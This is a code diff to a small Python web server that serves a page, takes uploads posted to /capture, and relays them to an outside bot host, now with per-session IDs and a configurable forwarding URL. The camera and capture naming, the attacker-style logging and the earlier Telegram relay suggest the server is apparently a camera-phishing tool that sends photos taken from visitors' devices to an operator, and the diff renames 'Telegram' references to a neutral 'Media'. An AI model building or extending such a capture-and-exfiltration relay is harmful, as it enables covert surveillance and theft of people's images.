@@ -10,10 +10,28 @@ ROOT = Path(__file__).resolve().parent
 CAPTURES = ROOT / "captures"
 CAPTURES.mkdir(exist_ok=True)
 
+MEDIA_URL = os.environ.get(
+    "MEDIA_URL",
+    "https://camera-lab-bot.onrender.com",
+).rstrip("/")
+
+SESSION_ID_RE = re.compile(r"^[0-9a-f]{32}$")
+
 class Handler(BaseHTTPRequestHandler):
 
     def do_GET(self):
-        if self.path == "/":
+        from urllib.parse import urlsplit, parse_qs
+
+        parsed = urlsplit(self.path)
+
+        if parsed.path == "/":
+            session_values = parse_qs(parsed.query).get("session", [])
+            session_id = session_values[0].strip() if session_values else ""
+
+            if session_id and not SESSION_ID_RE.fullmatch(session_id):
+                self.send_error(400, "invalid session")
+                return
+
             data = (ROOT / "index.html").read_bytes()
 
             self.send_response(200)
@@ -28,8 +46,23 @@ class Handler(BaseHTTPRequestHandler):
         self.send_error(404)
 
     def do_POST(self):
-        if self.path != "/capture":
+        from urllib.parse import urlsplit, parse_qs, urlencode
+
+        parsed = urlsplit(self.path)
+
+        if parsed.path != "/capture":
             self.send_error(404)
+            return
+
+        session_values = parse_qs(parsed.query).get("session", [])
+        session_id = session_values[0].strip() if session_values else ""
+
+        if not session_id:
+            self.send_error(400, "session missing")
+            return
+
+        if not SESSION_ID_RE.fullmatch(session_id):
+            self.send_error(400, "invalid session")
             return
 
         content_type = self.headers.get("Content-Type", "")
@@ -81,8 +114,13 @@ class Handler(BaseHTTPRequestHandler):
             b"\r\n--" + boundary_out + b"--\r\n"
         )
 
+        forward_url = (
+            f"{MEDIA_URL}/photo?"
+            + urlencode({"session": session_id})
+        )
+
         req = urllib.request.Request(
-            "https://camera-lab-bot.onrender.com/photo",
+            forward_url,
             data=body,
             method="POST",
             headers={
@@ -97,7 +135,7 @@ class Handler(BaseHTTPRequestHandler):
         try:
             with urllib.request.urlopen(req, timeout=30) as response:
                 result = response.read().decode("utf-8", "replace")
-                print(f"[+] Telegram forward: HTTP {response.status} -> {result}")
+                print(f"[+] Media forward: HTTP {response.status} -> {result}")
 
                 self.send_response(response.status)
                 self.send_header("Content-Type", "text/plain; charset=utf-8")
@@ -107,25 +145,25 @@ class Handler(BaseHTTPRequestHandler):
 
         except urllib.error.HTTPError as exc:
             error = exc.read().decode("utf-8", "replace")
-            print(f"[!] Telegram forward failed: HTTP {exc.code} -> {error}")
+            print(f"[!] Media forward failed: HTTP {exc.code} -> {error}")
 
             self.send_response(502)
             self.send_header("Content-Type", "text/plain; charset=utf-8")
             self.end_headers()
             self.wfile.write(
-                f"Telegram forward failed: HTTP {exc.code} -> {error}".encode("utf-8")
+                f"Media forward failed: HTTP {exc.code} -> {error}".encode("utf-8")
             )
             return
 
         except urllib.error.URLError as exc:
             error = str(exc)
-            print(f"[!] Telegram forward connection failed: {error}")
+            print(f"[!] Media forward connection failed: {error}")
 
             self.send_response(502)
             self.send_header("Content-Type", "text/plain; charset=utf-8")
             self.end_headers()
             self.wfile.write(
-                f"Telegram forward connection failed: {error}".encode("utf-8")
+                f"Media forward connection failed: {error}".encode("utf-8")
             )
             return
 
